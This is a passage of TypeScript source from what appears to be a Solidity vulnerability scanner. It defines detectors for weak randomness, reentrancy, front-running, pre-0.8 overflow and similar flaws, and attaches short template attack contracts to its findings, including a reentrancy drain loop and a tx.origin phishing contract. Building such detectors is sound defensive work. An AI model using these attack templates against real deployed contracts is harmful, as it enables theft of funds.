      exploitSolidity: `// (100 / 300) * 1e18 == 0\n// (100 * 1e18) / 300        == 3.33e17`,
      remediationSolidity: `return (uint256(a) * 1e18) / uint256(b);`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (/==\s*address\(this\)\.balance|address\(this\)\.balance\s*==|balance\s*==/.test(src)) {
    push(make({
      severity: "medium",
      swc: "SWC-132",
      title: `${fn.name} requires an exact balance`,
      confidence: "medium",
      detector: "strict-balance",
      summary: "A strict equality on a balance is broken by a force-fed ether transfer (selfdestruct, or a coinbase payment). The requirement then bricks the function.",
      walkthrough: "1. Anyone can increase a contract's ETH balance without calling it.\n2. require(address(this).balance == expected) starts failing permanently.\n3. Compare against an internal accounted variable, or use >=.",
      exploitSolidity: `selfdestruct(payable(victim)); // balance is now expected + 1`,
      remediationSolidity: `require(accounted == expected, "accounting");`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // Randomness = block data actually used as entropy, not merely read.
  // blockhash / prevrandao / difficulty alone are entropy (a hash or a
  // beacon value). block.timestamp / now / block.number / block.coinbase
  // alone are a CLOCK (round deadlines, vesting) — they only become
  // entropy when mixed into a hash or a modulo selection. The old
  // keyword fallback (any mention of "winner"/"lottery"/...) fired on
  // event fields, comments, and variable names: FomoXP's withdraw,
  // buyCore, reLoadCore use `now` as a round clock and mention
  // winnerAddr in an event, but draw no randomness. View/pure functions
  // cannot draw randomness that decides anything on-chain.
  //
  // All randomness regexes run on `clean` (comments and string
  // literals stripped, Fix 1c): F3Dx endRound's only `%` were the
  // `// 40% to winner` / `// 10% to dev rewards` comments, and a `%`
  // in a string is not a modulo. Entropy mixing requires block data
  // INSIDE the hash input (Fix 1b): keccak of EIP-712 typed data
  // (delegateBySig) does not mix entropy. An oracle-query nonce
  // (Fix 19) and a hash used only as an identifier (Fix 20) are not
  // randomness either.
  const clean = stripCommentsAndStrings(src);
  const entropySource = /blockhash\s*\(|block\.prevrandao|block\.difficulty/.test(clean);
  const clockSource = /block\.timestamp|\bnow\b|block\.number|block\.coinbase/.test(clean);
  const mixesEntropy = hashInputHasBlockData(clean) || moduloOfBlockData(clean);
  const oracleOnly = oracleNonceOnly(clean, fn.name);
  // R1 / R2 (2026-10-27 detection upgrade): the two measured recall gaps.
  // The five-field mixer is entropy whatever it is assigned to; a hash of
  // block data whose OUTPUT is later selected on is entropy too, so the
  // identifier-only suppression (Fix 20) must not eat it.
  const mixer = teamJustMixer(clean);
  const derived = derivedEntropySelected(clean);
  const idOnly = !entropySource && !mixer && !derived && hashOnlyAsIdentifier(clean);
  // Entropy laundered through a STATE VARIABLE (2026-10-27, recall-first):
  // `uint256 private salt = block.timestamp;` then `salt * block.number / 3`,
  // `salt % 300`. The clock never appears next to a hash or modulo in the same
  // function, so the rule above misses it — which is the random_number_generator
  // contract in SmartBugs Curated. Fired at low confidence: the link between the
  // seed assignment and the draw is one hop, not one expression.
  const launderedSeed = (() => {
    const seeded = new Set<string>();
    for (const c of model.contracts) {
      for (const v of c.stateVars) {
        // A DECLARATION initialised from block data (`uint256 salt = block.timestamp`),
        // not any later assignment: a checkpoint like `lastBlock = block.number`
        // is a clock cursor, not a seed. Treating the cursor as entropy made the
        // BiFi idle-gap fixture fire weak-randomness — caught by the corpus.
        const decl = new RegExp(
          `(?:uint\\d*|int\\d*|bytes32|var)\\s+(?:(?:public|private|internal|constant|immutable)\\s+)*${escapeRegExp(v.name)}\\s*=\\s*[^;]*(?:block\\.(?:timestamp|number|difficulty|prevrandao|coinbase)|blockhash\\s*\\()`,
        ).test(parsed);
        if (decl) seeded.add(v.name);
      }
    }
    for (const name of seeded) {
      const n = escapeRegExp(name);
      // Mixed, not merely moved: entropy is multiplied or reduced by modulo.
      // `block.number - lastBlock` is elapsed time, and subtracting a cursor is
      // not a draw.
      if (new RegExp(`\\b${n}\\b\\s*[%*/]|[%*/]\\s*\\b${n}\\b`).test(clean)) return name;
    }
    return null;
  })();
  const randomish =
    !oracleOnly &&
    !idOnly &&
    ((fn.mutability !== "view" && fn.mutability !== "pure" &&
      (entropySource || mixer || derived || (clockSource && mixesEntropy))) ||
      launderedSeed !== null);
  if (randomish) {
    push(make({
      severity: "high",
      swc: "SWC-120",
      title: mixer
        ? `${fn.name} mixes a five-field block fingerprint for its draw`
        : `${fn.name} draws randomness from the chain`,
      confidence: mixer ? "high" : "medium",
      detector: "weak-randomness",
      summary: mixer
        ? "The draw hashes three independent block fields (timestamp, difficulty/prevrandao, coinbase/gaslimit) — the Team Just mixer shape. Mixing more predictable values does not make a value unpredictable: a block producer still knows all three before the transaction is included."
        : "block.timestamp, prevrandao, difficulty, or blockhash is mixed into a number someone can bias. Miners and searchers see it before they decide to include the transaction.",
      walkthrough: "1. The inputs are known in the mempool, or nudgeable by the block producer.\n2. A caller who dislikes the result waits a block or uses a different sender.\n3. Use a VRF, or commit-reveal with a penalty.",
      exploitSolidity: `// Wait until uint256(keccak256(abi.encode(block.timestamp, msg.sender))) % n == winningIndex.`,
      remediationSolidity: "// Chainlink VRF, or a commit in block n revealed in block n+k.",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }
  // Timestamp dependence, loosened 2026-10-27: no longer an `else` to
  // weak-randomness (a function can draw from the clock AND gate on it), and a
  // bare comparison or `assert(` counts, not only `require(`/`if(`. That is the
  // ether_lotto / roulette / timed_crowdsale family, all labelled
  // time_manipulation in the corpus and all silent before this.
  if (
    /block\.timestamp|\bnow\b/.test(clean) &&
    (/(?:require|if|assert)\s*\(/.test(clean) ||
      /(?:return|\bif\b)[^;]{0,120}(?:block\.timestamp|\bnow\b)\s*(?:>=|<=|>|<|==)/.test(clean))
  ) {
    // Long-window computation: timestamp divided by >= 1 hour (e.g.
    // (block.timestamp - last) / (60*60*24)) — a ~15s producer shift is
    // immaterial over a days-scale window, so that is info, not low.
    const tsIdx = clean.indexOf("block.timestamp");
    const afterTs = tsIdx >= 0 ? clean.slice(tsIdx) : clean;
    const longWindow = (() => {
      const paren = afterTs.match(/\/\s*\(\s*([\d\s*]+)\)/);
      if (paren) {
        const nums = paren[1].split("*").map((n) => parseInt(n.trim(), 10)).filter((n) => Number.isFinite(n));
        if (nums.length > 0 && nums.reduce((a, b) => a * b, 1) >= 3600) return true;
      }
      const unit = afterTs.match(/\/\s*(\d+)\s*(days|hours|minutes)\b/);
      if (unit) {
        const mult = unit[2] === "days" ? 86400 : unit[2] === "hours" ? 3600 : 60;
        if (parseInt(unit[1], 10) * mult >= 3600) return true;
      }
      const lit = afterTs.match(/\/\s*(\d+)\b/);
      if (lit && parseInt(lit[1], 10) >= 3600) return true;
      return false;
    })();
    push(make({
      severity: longWindow ? "info" : "low",
      swc: "SWC-116",
      title: longWindow ? `${fn.name} uses block.timestamp in a long-window computation` : `${fn.name} branches on block.timestamp`,
      confidence: "medium",
      detector: "timestamp",
      summary: longWindow
        ? "block.timestamp feeds a computation divided by >= 1 hour. A producer can shift it by roughly 15 seconds, which is immaterial over a window this long."
        : "A timestamp check is fine for multi-hour windows. It is a soft gate around a single block: producers can shift it by roughly 15 seconds.",
      walkthrough: "1. Identify whether the window is a long vest or a one-block race.\n2. If funds move the moment the timestamp crosses a line, a producer can include or exclude the winning transaction.",
      exploitSolidity: "",
      remediationSolidity: "// Keep timestamp gates for coarse deadlines only.",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // Reentrancy through a MODIFIER (2026-10-27).
  //
  // `airDrop() hasNoBalance supportsToken { tokenBalance[msg.sender] += 20; }`
  // where `supportsToken` calls out to the caller. The modifier runs BEFORE the
  // body, so the callee re-enters while the balance the modifier checked is
  // still zero — the classic modifier reentrancy (SWC-107, and the
  // modifier_reentrancy contract in SmartBugs Curated).
  //
  // walkFn only walks FUNCTION bodies, so modifier bodies never contribute a
  // call to the flow. This is the structural approximation: a modifier that
  // calls out, followed by a body that writes state, is the window. Fired at
  // low confidence because the modifier's call is not ordered against the
  // body's writes by the flow analysis — the source order is the evidence.
  const modCallsOut = fn.modifiers.some((name) => {
    const def =
      contract.modifiers.find((m) => m.name === name) ??
      model.contracts.flatMap((c) => c.modifiers).find((m) => m.name === name);
    if (!def) return false;
    const src = stripCommentsAndStrings(def.source);
    return /\.\s*(?:call|delegatecall|send|transfer|staticcall)\s*[({]|\)\s*\.\s*\w+\s*\(/.test(src);
  });
  const bodyWrites = /\b[A-Za-z_$][\w$]*(?:\s*\[[^\]]*\])?\s*(?:\+=|-=|\*=|\/=)\s*/.test(clean);
  // No `!authed` here on purpose: re-entry by an AUTHORISED party is exactly
  // what this shape is. `supportsToken` even gates on the caller (it compares a
  // hash against Bank(msg.sender).supportsToken()), and that check is what the
  // attacker satisfies while re-entering. Gating the rule on auth hid the bug.
  if (modCallsOut && bodyWrites && isExternallyCallable(fn)) {
    push(make({
      severity: "high",
      swc: "SWC-107",
      title: `${fn.name} calls out from a modifier before its body writes state`,
      confidence: "low",
      detector: "reentrancy",
      summary: `One of ${fn.name}'s modifiers makes an external call, and the body then writes state. Modifiers run before the body, so the callee is executing while the state the modifier just checked is unchanged — it can re-enter ${fn.name} and pass the same check again. This is the modifier_reentrancy shape in SmartBugs Curated: airDrop() is guarded by a zero-balance modifier and a supportsToken() call to the caller, and the airdrop credit lands after both.`,
      walkthrough: `1. ${fn.name} runs its modifiers first; one of them calls out to an address the caller controls.\n2. The call is live before the body has written anything.\n3. The callee re-enters ${fn.name}, and the modifier's check still passes.\n4. The body then credits the caller once per entry.\n5. Do the state write before the modifier's external call, or move the call into the body after the write.`,
      exploitSolidity: `contract Reenter {\n    function supportsToken() external returns (bytes32) {\n        IVictim(target).${fn.name}(); // re-enter while the guard still passes\n        return keccak256(abi.encodePacked("Nu Token"));\n    }\n}`,
      remediationSolidity: `modifier supportsToken() {\n    _;                       // body first: the credit is written\n    require(ok, "token");    // then the external check\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // front-running (2026-10-27, item 4 of the quality list).
  //
  // The detector existed in the registry, the SmartBugs map and the PoC library
  // with NO rule behind it — a phantom, found when the family registry was made
  // total. Two shapes cover the corpus's four contracts, and both are ordering
  // problems rather than access problems:
  //
  //  (a) the ERC-20 approve race: `approve` overwrites an allowance directly,
  //      so a spender who sees the new value in the mempool can spend the old
  //      one first (SWC-114);
  //  (b) a reward paid for an answer revealed in the transaction: the solution
  //      is visible before the transaction lands, so a searcher copies it and
  //      takes the payout (FindThisHash, the tx-order-dependence cases).
  const erc20ApproveRace =
    /^approve$/i.test(fn.name) &&
    /\b_?(?:allowance|allowed|allowances)\w*\s*\[[^\]]*\]\s*(?:\[[^\]]*\]\s*)?=\s*/.test(clean) &&
    contract.functions.some((f) => /^transferFrom$/i.test(f.name));
  // Nested parens: `keccak256(abi.encodePacked(x)) == h` breaks a `[^)]*` scan,
  // so allow a bounded span instead of a single paren group.
  const revealsAnswer =
    /(?:keccak256|sha3)\s*\([\s\S]{0,240}?==|==\s*(?:keccak256|sha3)\s*\(/.test(clean) ||
    /require\s*\([^;]{0,240}?\b(?:answer|solution|secret|guess)\b[^;]{0,160}?==|==\s*\w*(?:answer|solution|secret)\b/i.test(clean);
  const paysCaller = /\.\s*(?:transfer|send)\s*\(|\.call\s*\{[^}]*value/.test(clean) && /msg\.sender/.test(clean);
  // A commit path closes the answer-reveal race: the answer is hidden behind a
  // hash the player stored before the payout could be claimed. The fixture that
  // proves the rule also proves the exemption.
  const hasCommitPath = contract.functions.some(
    (f) => /^commit/i.test(f.name) && /\[[^\]]*\]\s*=/.test(f.source),
  );
  if (
    isExternallyCallable(fn) &&
    !authed &&
    (erc20ApproveRace || (revealsAnswer && paysCaller && !hasCommitPath))
  ) {
    push(make({
      severity: "medium",
      swc: "SWC-114",
      title: erc20ApproveRace ? `${fn.name} overwrites an allowance (approve race)` : `${fn.name} pays for an answer revealed in the transaction`,
      confidence: "medium",
      detector: "front-running",
      summary: erc20ApproveRace
        ? "approve() writes the allowance directly, so a spender who sees the new value in the mempool can spend the OLD allowance first and then the new one — the classic ERC-20 approve race (SWC-114). The token cannot tell a legitimate change from a front-run."
        : "The payout depends on a value the caller supplies in the transaction (an answer, a guess, a hash preimage). That value is visible in the mempool before it lands, so a searcher can copy it, submit it with a higher fee, and take the reward. Nothing here commits to the answer before it is revealed.",
      walkthrough: erc20ApproveRace
        ? "1. The owner calls approve(spender, newAmount), which overwrites the stored allowance.\n2. The spender sees the transaction in the mempool and spends the old allowance first.\n3. The approve lands, and the spender spends the new allowance too — total spend is old + new.\n4. Use increaseAllowance/decreaseAllowance, or require the allowance to be zero before changing it."
        : "1. The function pays out when a caller-supplied value matches a stored answer.\n2. The value is in the transaction before it is mined, so anyone watching the mempool can copy it.\n3. The copy lands first and takes the payout.\n4. Commit first: the player submits keccak256(answer + secret), and reveals only after their commit is mined.",
      exploitSolidity: erc20ApproveRace
        ? `// Front-run the approve: spend the old allowance, then the new one.\ntoken.transferFrom(owner, attacker, oldAllowance);\n// ... approve lands ...\ntoken.transferFrom(owner, attacker, newAllowance);`
        : `// Copy the answer out of the mempool and land first with a higher fee.\nIVictim(target).${fn.name}(answerFromTheMempool);`,
      remediationSolidity: erc20ApproveRace
        ? `function increaseAllowance(address spender, uint256 added) external returns (bool) {\n    allowance[msg.sender][spender] += added;\n    return true;\n}`
        : `// Commit-reveal: the answer is hidden until the commit is mined.\nfunction commit(bytes32 h) external { commits[msg.sender] = h; }\nfunction reveal(uint256 answer, bytes32 salt) external {\n    require(keccak256(abi.encode(answer, salt)) == commits[msg.sender], "no");\n    _pay(msg.sender);\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // Pre-0.8 arithmetic (2026-10-27, item 3 of the quality list).
  //
  // `arithmetic` recall was 0.000 on 15 SmartBugs contracts, all 0.4.x: the
  // `unchecked-block` rule below looks for an `unchecked { }` block, which only
  // exists from 0.8, so it cannot see the class it is named after in the era
  // that class comes from. The pre-0.8 shape is different and just as
  // mechanical: a compound assignment on stored state with no SafeMath call in
  // the same function.
  //
  // Gated three ways so it stays a signal rather than noise:
  //   - the compilation targets a compiler below 0.8 (the model's pragma floor);
  //   - the assignment is compound (-= += *= /=) or an index write on stored
  //     state — a plain `=` is not arithmetic;
  //   - no SafeMath-style call (`.add(`/`.sub(`/`.mul(`/`.div(`, or a
  //     `SafeMath`/`Math.` reference) appears in the function.
  // versionFloor is major*1000 + minor (8024 for 0.8.24, 4019 for 0.4.19) —
  // NOT a packed major/minor/patch integer. Comparing against 8_000_000 made
  // this always true, so the rule fired on 0.8 code, where the compiler emits
  // the overflow check and there is nothing to find. Caught by the 2026-era
  // corpus, whose fixtures are 0.8.24 and were reported as unchecked arithmetic.
  const pre08 = model.versionFloor !== null && model.versionFloor < 8000;
  if (pre08) {
    const cleanArith = stripCommentsAndStrings(src);
    const usesSafeMath = /\.\s*(?:add|sub|mul|div|mod)\s*\(|SafeMath|\.tryAdd\s*\(/.test(cleanArith);
    // `--`/`++` count too: `bonusCodes.length--` on a pre-0.8 array is an
    // underflow to 2^256-1, which is the arbitrary_location_write shape.
    const compound = [
      ...cleanArith.matchAll(/([A-Za-z_$][\w$]*(?:\s*\[[^\]]*\])?(?:\s*\.\s*\w+)?)\s*(-=|\+=|\*=|\/=|--|\+\+)/g),
    ];
    const storedNames = new Set(contract.stateVars.map((v) => v.name));
    const storedArith = compound.find((m) => {
      // `bonusCodes.length--` and `acc.balance -= x` are writes to a state
      // VAR through a member, so the head is the first identifier, not the
      // whole member path.
      const head = (m[1] ?? "").split("[")[0]!.split(".")[0]!.trim();
      return storedNames.has(head);
    });
    // The other pre-0.8 shape: the underflow guard itself, `require(balance -
    // value >= 0)`. Unsigned arithmetic makes that always true, so the check
    // that was meant to prevent the underflow guarantees nothing — BECToken's
    // shape, and the reason `arithmetic` missed it while `front-running` fired
    // on the same contract's approve().
    const uselessUnderflowGuard =
      /(?:require|assert)\s*\([^;]{0,120}?[A-Za-z_$][\w$.]*(?:\[[^\]]*\])?\s*-\s*[A-Za-z_$0-9][\w$.]*\s*>=\s*0\s*\)/.test(cleanArith) &&
      !usesSafeMath;
    if ((storedArith || uselessUnderflowGuard) && !usesSafeMath && fn.mutability !== "view" && fn.mutability !== "pure") {
      push(make({
        severity: "medium",
        swc: "SWC-101",
        title: storedArith
          ? `${fn.name} does arithmetic on stored state before 0.8`
          : `${fn.name} guards an underflow with a check that cannot fail`,
        confidence: "medium",
        detector: "unchecked-block",
        summary: `The contract targets a compiler below 0.8, so ${storedArith ? `${storedArith[1]}${storedArith[2]}` : "a subtraction"} wraps instead of reverting — and no SafeMath call guards it in this function. A subtraction underflow turns a balance into 2^256-1 and an addition overflow turns a supply into zero, which is the arithmetic class behind the 0.4.x/0.5.x losses (and Truebit's 2026 loss was this same class in a contract deployed five years earlier).`,
        walkthrough: `1. The pragma floor is below 0.8, so the compiler emits no overflow check.\n2. ${fn.name} performs ${storedArith ? `${storedArith[1]} ${storedArith[2]}` : "arithmetic"} on stored state.\n3. A caller who can drive that value past zero (or past 2^256) gets a wrapped result — an enormous balance or a zeroed supply.\n4. Use SafeMath (pre-0.8) or move to 0.8+, where the check is built in.`,
        exploitSolidity: `// Pre-0.8: underflow makes the balance enormous.\nIVictim(target).${fn.name}(type(uint256).max);`,
        remediationSolidity: `// pre-0.8: use SafeMath for every stored-value operation\ncount = count.sub(input);\n// or compile with 0.8+, where underflow reverts`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
  }

  if (/extcodesize/.test(src)) {
    push(make({
      severity: "medium",
      swc: null,
      title: `${fn.name} uses extcodesize as an identity check`,
      confidence: "low",
      detector: "extcodesize",
      summary: "extcodesize(addr) == 0 is true for EOAs and also for a contract that is still inside its constructor. It does not prove the caller is an EOA once they call you from a constructor.",
      walkthrough: "1. During construction, the address has no code yet.\n2. A constructor can call this function and pass the check, then finish deploying.\n3. Do not use it for security. If you must block contracts, accept the constructor bypass explicitly.",
      exploitSolidity: `contract Bypass {\n    constructor(address victim) {\n        Victim(victim).mint(); // extcodesize(address(this)) == 0 here\n    }\n}`,
      remediationSolidity: "// Drop the check, or use tx.origin == msg.sender only with eyes open (it has its own phishing problem).",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  for (const p of fn.params) {
    if (p.name && contract.stateVars.some((v) => v.name === p.name)) {
      push(make({
        severity: "low",
        swc: "SWC-119",
        title: `${fn.name} shadows state variable ${p.name}`,
        confidence: "high",
        detector: "shadowing",
        summary: `Parameter ${p.name} hides the state variable of the same name. An assignment may update the local and leave storage unchanged.`,
        walkthrough: "1. Inside the function the name binds to the parameter.\n2. `p = msg.sender` does not change storage.\n3. Rename the parameter.",
        exploitSolidity: "",
        remediationSolidity: `function ${fn.name}(address _${p.name}) external { ${p.name} = _${p.name}; }`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
      break;
    }
  }

  if (/\.(transferFrom)\s*\(/.test(src) && /balances\s*\[[^\]]+\]\s*(\+=|=)/.test(src) && !/balanceOf/.test(src)) {
    push(make({
      severity: "low",
      swc: null,
      title: `${fn.name} assumes a transfer moved the full amount`,
      confidence: "low",
      detector: "fee-on-transfer",
      summary: "The function credits an input amount after transferFrom and never measures the balance delta. Fee-on-transfer and rebasing tokens desynchronize the books.",
      walkthrough: "1. transferFrom returns success but the contract receives less than `amount`.\n2. The internal balance still increases by `amount`.\n3. Later withdrawals pay out more than the contract holds.",
      exploitSolidity: "",
      remediationSolidity: `uint256 beforeBal = token.balanceOf(address(this));\ntoken.safeTransferFrom(msg.sender, address(this), amount);\nuint256 received = token.balanceOf(address(this)) - beforeBal;\nbalances[msg.sender] += received;`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  const addrWrite = contract.stateVars.find((v) => v.typeName === "address" && rx(`\\b${v.name}\\s*=\\s*${fn.params.find((p) => p.typeName === "address")?.name}\\b`).test(src));
  // A zero guard for THIS parameter exempts the write: require(p != 0),
  // require(p != address(0)), if (p == 0) throw/revert. The old check only
  // saw address(0), so `if (newOwner == 0) throw` was still flagged.
  const zeroParam = fn.params.find((p) => p.typeName === "address")?.name;
  const hasZeroGuard = Boolean(
    zeroParam &&
      rx(
        `(require\\s*\\(\\s*${zeroParam}\\s*!=|if\\s*\\(\\s*${zeroParam}\\s*==\\s*(0\\b|address\\s*\\(\\s*0\\s*\\)))`,
      ).test(src),
  );
  // Fix 28: an INTERNAL (or private) zero-address setter fires only
  // when some reachable caller can pass zero without a gate. OZ
  // _transferOwnership's only callers are transferOwnership (requires
  // newOwner != address(0)) and renounceOwnership (intentionally
  // zeroes) — so it does not flag. Public/external setters keep
  // flagging on their own shape (no caller analysis needed).
  const isInternalSetter = fn.visibility === "internal" || fn.visibility === "private";
  if (addrWrite && !hasZeroGuard && !/address\s*\(\s*0\s*\)/.test(src) && !fn.isConstructor && !(isInternalSetter && !internalZeroSetterHasUngatedCaller(fn, contract, model))) {
    push(make({
      severity: "medium",
      swc: null,
      title: `${fn.name} can set ${addrWrite.name} to the zero address`,
      confidence: "medium",
      detector: "zero-address",
      summary: `An address argument is stored in ${addrWrite.name} with no address(0) check. A zero owner or oracle bricks every later authorization or price read.`,
      walkthrough: "1. The parameter is written straight into storage.\n2. address(0) then passes `signer == oracle` style checks for the wrong reason, or makes onlyOwner permanently false.\n3. require(next != address(0)).",
      exploitSolidity: "",
      remediationSolidity: `require(next != address(0), "zero");\n${addrWrite.name} = next;`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // Pre-0.4.21 code invokes events without the `emit` keyword
  // (OwnerChanged(newOwner);), so a bare /emit/ test false-positives on
  // 0.4.x contracts. A call to a declared event name counts as an emit.
  const emitsEvent = /emit\s+/.test(src) || contract.events.some((e) => rx(`\\b${e.name}\\s*\\(`).test(src));
  if (writesOwner(src, contract) && !emitsEvent && !fn.isConstructor) {
    push(make({
      severity: "info",
      swc: null,
      title: `${fn.name} changes an authority variable without an event`,
      confidence: "medium",
      detector: "missing-event",
      summary: "Owner, admin, or oracle is reassigned and the function emits nothing. Off-chain monitors will not see the rotation.",
      walkthrough: "1. Events are how indexers notice privilege changes.\n2. Emit the previous and next value.",
      exploitSolidity: "",
      remediationSolidity: "emit OwnershipTransferred(previous, next);",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: "",
    }));
  }

  for (const v of contract.stateVars) {
    if (/password|secret|privatekey|apikey|seedphrase|mnemonic/i.test(v.name)) {
      push(make({
        severity: "info",
        swc: "SWC-136",
        title: `${v.name} looks like a secret stored on-chain`,
        confidence: "medium",
        detector: "private-secret",
        summary: "Storage is public. private and internal only change the compiler's accessor rules. The value is readable with eth_getStorageAt.",
        walkthrough: "1. Deploy, then read the slot.\n2. Nothing in the contract can hide a key from a node.\n3. Keep secrets off-chain or store a hash and reveal later.",
        exploitSolidity: "",
        remediationSolidity: "bytes32 public commitment; // keccak256(secret), not the secret",
        locationFn: null,
        locationLine: v.line,
        snippet: snippet(parsed, v.line + delta, delta),
      }));
    }
  }
  // Fix 30: abi.encodePacked fires ONLY when the packed bytes flow
  // into a hash (keccak256/sha3). Plain string concatenation
  // (MettiApe tokenURI: abi.encodePacked(currentBaseURI,
  // tokenId.toString(), baseExtension) for a string return) has no
  // collision: there is no hash to collide on. Text-based: for each
  // encodePacked call with >= 2 args and at least one dynamic arg (a
  // param/state var whose type is string/bytes/array but not a fixed
  // bytesN), flag only when (a) the call sits inside a keccak256( /
  // sha3( argument span, or (b) its assigned variable flows into a
  // hash call elsewhere in the function. Runs on a
  // length-preserving comment/string-stripped copy (Fix 1c class):
  // a commented-out or string-literal encodePacked/hash cannot flag,
  // and line numbers still match the original source.
  {
    const text = stripCommentsAndStringsKeepLines(src);
    const hashSpans: Array<[number, number]> = [];
    for (const m of text.matchAll(/\b(keccak256|sha3)\s*\(/g)) {
      const openIdx = m.index + m[0].length - 1;
      const closeIdx = parenClose(text, openIdx);
      if (closeIdx >= 0) hashSpans.push([openIdx, closeIdx]);
    }
    const dynamicArg = (arg: string): boolean => {
      const id = arg.trim().match(/^([A-Za-z_$][\w$]*)/)?.[1] ?? "";
      const p = fn.params.find((x) => x.name === id);
      const s = contract.stateVars.find((x) => x.name === id);
      const t = p?.typeName ?? s?.typeName ?? "";
      return /string|bytes|\[\]/.test(t) && !/bytes32|bytes16|bytes4/.test(t);
    };
    for (const m of text.matchAll(/abi\.encodePacked\s*\(/g)) {
      const openIdx = m.index + m[0].length - 1;
      const closeIdx = parenClose(text, openIdx);
      if (closeIdx < 0) continue;
      const args = splitTopLevel(text.slice(openIdx + 1, closeIdx));
      if (args.length < 2) continue;
      if (!args.some(dynamicArg)) continue;
      const callStart = m.index;
      const callEnd = closeIdx;
      const insideHash = hashSpans.some(([hs, he]) => hs < callStart && callEnd < he);
      let varFlowsToHash = false;
      if (!insideHash) {
        // The variable assigned the packed bytes: the last
        // `identifier =` before the call in this statement.
        const stmtStart = Math.max(text.lastIndexOf(";", callStart), text.lastIndexOf("{", callStart), text.lastIndexOf("}", callStart)) + 1;
        const stmtEnd = text.indexOf(";", callEnd);
        const stmt = text.slice(stmtStart, stmtEnd < 0 ? src.length : stmtEnd);
        const assignMatches = [...stmt.slice(0, callStart - stmtStart).matchAll(/([A-Za-z_$][\w$]*)\s*=(?!=)/g)];
        const assigned = assignMatches[assignMatches.length - 1]?.[1];
        if (assigned) {
          varFlowsToHash = hashSpans.some(([hs, he]) => rx(`\\b${assigned}\\b`).test(text.slice(hs, he)));
        }
      }
      if (!insideHash && !varFlowsToHash) continue;
      const callLine = fn.line + (text.slice(0, callStart).match(/\n/g) ?? []).length;
      push(make({
        severity: "medium",
        swc: "SWC-133",
        title: `${fn.name} hashes abi.encodePacked dynamic arguments`,
        confidence: "medium",
        detector: "encode-packed",
        summary: "encodePacked concatenates without lengths. Two dynamic values (string, bytes, arrays) can be rearranged by the caller so different inputs share one hash.",
        walkthrough: [
          "1. encodePacked(string a, string b) is just the raw bytes of a followed by b.",
          '2. ("ab","c") and ("a","bc") produce the same payload and the same keccak.',
          "3. If that hash is a signature preimage, an allowance, or a commitment, the collision is the exploit.",
        ].join("\n"),
        exploitSolidity: `// Both hash to the same digest:
keccak256(abi.encodePacked("ab", "c"));
keccak256(abi.encodePacked("a", "bc"));`,
        remediationSolidity: `bytes32 hash = keccak256(abi.encode(id, note)); // length-prefixed`,
        locationFn: fn.name,
        locationLine: callLine,
        snippet: snippet(parsed, callLine + delta, delta),
      }));
    }
  }
}

function writesOwner(src: string, contract: ContractModel): boolean {
  return contract.stateVars.some((v) => PRIVILEGED.test(v.name) && rx(`\\b${v.name}\\s*=`).test(src));
}

function hasDivThenMul(body: AstNode | null): boolean {
  let hit = false;
  const visit = (node: unknown, parentMul: boolean) => {
    if (!node || typeof node !== "object" || hit) return;
    if (Array.isArray(node)) {
      node.forEach((n) => visit(n, parentMul));
      return;
    }
    const n = node as AstNode;
    const isMul = n.type === "BinaryOperation" && n.operator === "*";
    if (isMul && (isDivNode(n.left) || isDivNode(n.right))) hit = true;
    for (const [k, v] of Object.entries(n)) {
      if (k === "loc" || k === "range") continue;
      if (v && typeof v === "object") visit(v, isMul || parentMul);
    }
  };
  visit(body, false);
  return hit;
}

function isDivNode(node: unknown): boolean {
  const n = unwrapExpr(node);
  return Boolean(n && n.type === "BinaryOperation" && n.operator === "/");
}

function unwrapExpr(node: unknown): AstNode | null {
  if (!node || typeof node !== "object") return null;
  const n = node as AstNode;
  if (n.type === "TupleExpression" && Array.isArray(n.components) && n.components.length === 1) {
    return unwrapExpr(n.components[0]);
  }
  return n;
}

function originWalk(name: string): string {
  return [
    `1. ${name} reads tx.origin, the EOA that signed the outer transaction.`,
    "2. msg.sender can be a contract. The check does not notice.",
    "3. The victim is persuaded to call an attacker contract (a fake 'claim' or approval helper).",
    "4. That contract calls this function. tx.origin is still the victim, so the check passes, and the attacker is the one who receives the side effect.",
  ].join("\n");
}

function originExploit(contractName: string, fn: string): string {
  return `interface IVictim { function ${fn}(address payable to) external; }

contract Phish {
    function lure(address victim, address payable me) external {
        // The owner calls lure(). tx.origin inside ${contractName} is the owner.
        IVictim(victim).${fn}(me);
    }
}`;
}

function originFix(): string {
  return `require(msg.sender == owner, "owner");`;
}

function reentrancyWalk(contractName: string, fn: FnModel, call: ExtCall | null): string {
  return [
    `1. ${contractName}.${fn.name} reaches an external call${call ? ` (${call.kind} at line ${call.line})` : ""}.`,
    "2. The callee's fallback or receive runs before this function finishes.",
    "3. Storage that the call depends on — a balance, a paid flag, a share total — is updated only after the call returns, so the re-entering call still sees the old value.",
    "4. Repeat until the ether or the credit is gone. A sibling function that reads the same storage can be used instead of calling this function again.",
  ].join("\n");
}

function reentrancyExploit(contractName: string, fn: string): string {
  return `interface IVictim { function deposit() external payable; function ${fn}() external; }

contract Reenter {
    IVictim victim;
    uint256 hits;
    constructor(address v) { victim = IVictim(v); }
    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.${fn}();
    }
    receive() external payable {
        if (hits++ < 5 && address(victim).balance > 0) victim.${fn}();
    }
}`;
}

function reentrancyFix(fn: string): string {
  return `// Checks, then effects, then interaction.
function ${fn}() external nonReentrant {
    uint256 amount = balances[msg.sender];
